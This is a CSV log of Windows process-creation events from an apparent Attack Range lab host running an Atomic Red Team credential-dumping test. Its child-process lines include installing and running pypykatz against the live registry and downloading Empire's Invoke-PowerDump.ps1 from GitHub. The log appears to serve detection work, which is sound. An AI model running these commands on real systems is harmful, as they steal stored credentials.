dest,user,"parent_process","process_name",process,"process_id","parent_process_id",count,firstTime,lastTime
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","HOSTNAME.EXE","""C:\Windows\system32\HOSTNAME.EXE""",3800,3608,1,"2023-09-24T11:18:44","2023-09-24T11:18:44"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","HOSTNAME.EXE","""C:\Windows\system32\HOSTNAME.EXE""",3840,3608,1,"2023-09-24T11:18:43","2023-09-24T11:18:43"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","HOSTNAME.EXE","""C:\Windows\system32\HOSTNAME.EXE""",3860,3608,1,"2023-09-24T11:18:44","2023-09-24T11:18:44"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","cmd.exe","""C:\Windows\system32\cmd.exe"" /c ""py -3 --version &gt;nul 2&gt;&amp;1 &amp;&amp; exit /b %%errorlevel%%""",656,3608,1,"2023-09-24T11:18:45","2023-09-24T11:18:45"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","cmd.exe","""C:\Windows\system32\cmd.exe"" /c ""py -3 -m pip --version &gt;nul 2&gt;&amp;1 &amp;&amp; exit /b %%errorlevel%%""",1028,3608,1,"2023-09-24T11:18:45","2023-09-24T11:18:45"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","cmd.exe","""C:\Windows\system32\cmd.exe"" /c ""pypykatz -h &gt;nul 2&gt;&amp;1 &amp;&amp; exit /b %%errorlevel%%""",3124,3608,1,"2023-09-24T11:19:00","2023-09-24T11:19:00"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","cmd.exe","""C:\Windows\system32\cmd.exe"" /c ""pypykatz -h &gt;nul 2&gt;&amp;1 &amp;&amp; exit /b %%errorlevel%%""",680,3608,1,"2023-09-24T11:18:47","2023-09-24T11:18:47"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","cmd.exe","""cmd.exe"" /c ""pip install pypykatz""",904,3608,1,"2023-09-24T11:18:47","2023-09-24T11:18:47"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","csc.exe","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\Administrator\AppData\Local\Temp\so111rqw\so111rqw.cmdline""",1712,3608,1,"2023-09-24T11:18:43","2023-09-24T11:18:43"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" &amp; {if (Test-Path \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\PowerDump.ps1\"""") {exit 0} else {exit 1}}",2592,3608,1,"2023-09-24T11:19:03","2023-09-24T11:19:03"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","powershell.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" &amp; {if (Test-Path \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\PowerDump.ps1\"""") {exit 0} else {exit 1}}",3008,3608,1,"2023-09-24T11:19:01","2023-09-24T11:19:01"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","powershell.exe","""powershell.exe"" &amp; {Invoke-Webrequest -Uri \""""https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\"""" -UseBasicParsing -OutFile \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\PowerDump.ps1\""""}",1144,3608,1,"2023-09-24T11:19:02","2023-09-24T11:19:02"
"ar-win-2.attackrange.local",Administrator,"""powershell.exe"" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEcAZQB0AFAAcgBlAHIAZQBxAHMA","whoami.exe","""C:\Windows\system32\whoami.exe""",3052,3608,1,"2023-09-24T11:18:44","2023-09-24T11:18:44"
"ar-win-2.attackrange.local",Administrator,"C:\Python311\Scripts\pip.exe","python.exe","""C:\Python311\python.exe""  ""C:\Python311\Scripts\pip.exe"" install pypykatz",0x14c,0xa78,1,"2023-09-24T11:18:47","2023-09-24T11:18:47"
"ar-win-2.attackrange.local",Administrator,"C:\Python311\Scripts\pypykatz.exe","python.exe","""C:\Python311\python.exe""  ""C:\Python311\Scripts\pypykatz.exe"" -h",0xef4,0x97c,1,"2023-09-24T11:19:00","2023-09-24T11:19:00"
"ar-win-2.attackrange.local",Administrator,"C:\Python311\Scripts\pypykatz.exe","python.exe","""C:\Python311\python.exe""  ""C:\Python311\Scripts\pypykatz.exe"" live registry",0xe58,0xa48,1,"2023-09-24T11:19:09","2023-09-24T11:19:09"
"ar-win-2.attackrange.local",Administrator,"C:\Python311\python.exe","cmd.exe","C:\Windows\system32\cmd.exe /c ""ver""",0x36c,0x1d0,1,"2023-09-24T11:18:46","2023-09-24T11:18:46"
"ar-win-2.attackrange.local",Administrator,"C:\Python311\python.exe","cmd.exe","C:\Windows\system32\cmd.exe /c ""ver""",0x554,0x14c,1,"2023-09-24T11:18:47","2023-09-24T11:18:47"
"ar-win-2.attackrange.local",Administrator,"C:\Python311\python.exe","cmd.exe","C:\Windows\system32\cmd.exe /c ""ver""",0x7f4,0xe58,1,"2023-09-24T11:19:09","2023-09-24T11:19:09"
"ar-win-2.attackrange.local",Administrator,"C:\Python311\python.exe","cmd.exe","C:\Windows\system32\cmd.exe /c ""ver""",0xd3c,0xef4,1,"2023-09-24T11:19:01","2023-09-24T11:19:01"
"ar-win-2.attackrange.local",Administrator,"C:\Python311\python.exe -m pip --version","cmd.exe","C:\Windows\system32\cmd.exe /c ""ver""",876,464,1,"2023-09-24T11:18:46","2023-09-24T11:18:46"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES24DA.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\CSCDA330A84A8B4F49B56A1CF06D1738D9.TMP""",0xff4,0xcb0,1,"2023-09-24T11:18:38","2023-09-24T11:18:38"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES26CE.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\ansible-moduletmp-133400279192352871-275900552\CSC5C543E8BC582458FAEA27E59FB836A5C.TMP""",0xc24,0x1e0,1,"2023-09-24T11:18:39","2023-09-24T11:18:39"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES346A.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\CSCD1B090FFD8A744F49F7B10784B63CE77.TMP""",0x96c,0xe00,1,"2023-09-24T11:18:42","2023-09-24T11:18:42"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES3862.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\so111rqw\CSC6C6AE78E35B9407DA633A871C9C424.TMP""",0x948,0x6b0,1,"2023-09-24T11:18:43","2023-09-24T11:18:43"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES7F3F.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\ek1sxfsl\CSCFA0AD5DEA8134F8C911EE8C63A98399.TMP""",0x7b4,0x928,1,"2023-09-24T11:19:01","2023-09-24T11:19:01"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES826B.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\fgvu1b3y\CSC10AB12E1C66445FA965BE323398433A0.TMP""",0xe0c,0x580,1,"2023-09-24T11:19:02","2023-09-24T11:19:02"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES871E.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\an1mexxx\CSC8100BF65361A4AECB292B805283E6AD.TMP""",0xef8,0xf08,1,"2023-09-24T11:19:04","2023-09-24T11:19:04"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES8EBF.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\CSC990F7FEBC7414CA9A3433024496A9E7B.TMP""",0xc38,0xf4c,1,"2023-09-24T11:19:05","2023-09-24T11:19:05"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES919E.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\qtwax1xj\CSCB3DBC51C735E42EDB4C5E3FFA775F54.TMP""",0xfe4,0xfec,1,"2023-09-24T11:19:06","2023-09-24T11:19:06"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESAC69.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\vmcjfqdn\CSCF1AEBBE652C544BBBF2DDE44CF25F4E6.TMP""",0x5c0,0xfa8,1,"2023-09-24T11:19:13","2023-09-24T11:19:13"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESB1B9.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\pug2a4w5\CSC5FC7D1EA5BB6424F85C99730B1AC79A5.TMP""",0xa94,0xf58,1,"2023-09-24T11:19:14","2023-09-24T11:19:14"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESB5EF.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\denmf3pb\CSCFA7AB053470C4C15987ED07EDD6ACF16.TMP""",0xa58,0xebc,1,"2023-09-24T11:19:15","2023-09-24T11:19:15"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESBAC1.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\3d31m1j0\CSC13DE0F26EF8E4FD8A87D96E770665F14.TMP""",0xfbc,0xf1c,1,"2023-09-24T11:19:17","2023-09-24T11:19:17"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESBB4E.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\s1oh1tyf\CSC52BB1242C3B479098FFC7D2D6250ED.TMP""",0xfa4,0xcbc,1,"2023-09-24T11:19:17","2023-09-24T11:19:17"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESBC57.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\byyqvq2r\CSC35A26D4DB86D49788A25632DCAD13FEF.TMP""",0x968,0xfe0,1,"2023-09-24T11:19:17","2023-09-24T11:19:17"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESC4B4.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\CSC437413C06BDA4FE78897DEC5E82414CB.TMP""",0x728,0x9a4,1,"2023-09-24T11:19:19","2023-09-24T11:19:19"
"ar-win-2.attackrange.local",Administrator,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","cvtres.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESC8AC.tmp"" ""c:\Users\Administrator\AppData\Local\Temp\be0epwcq\CSC74116B0E7C98457C9449EEF649D82BF.TMP""",0xbc0,0xe40,1,"2023-09-24T11:19:20","2023-09-24T11:19:20"
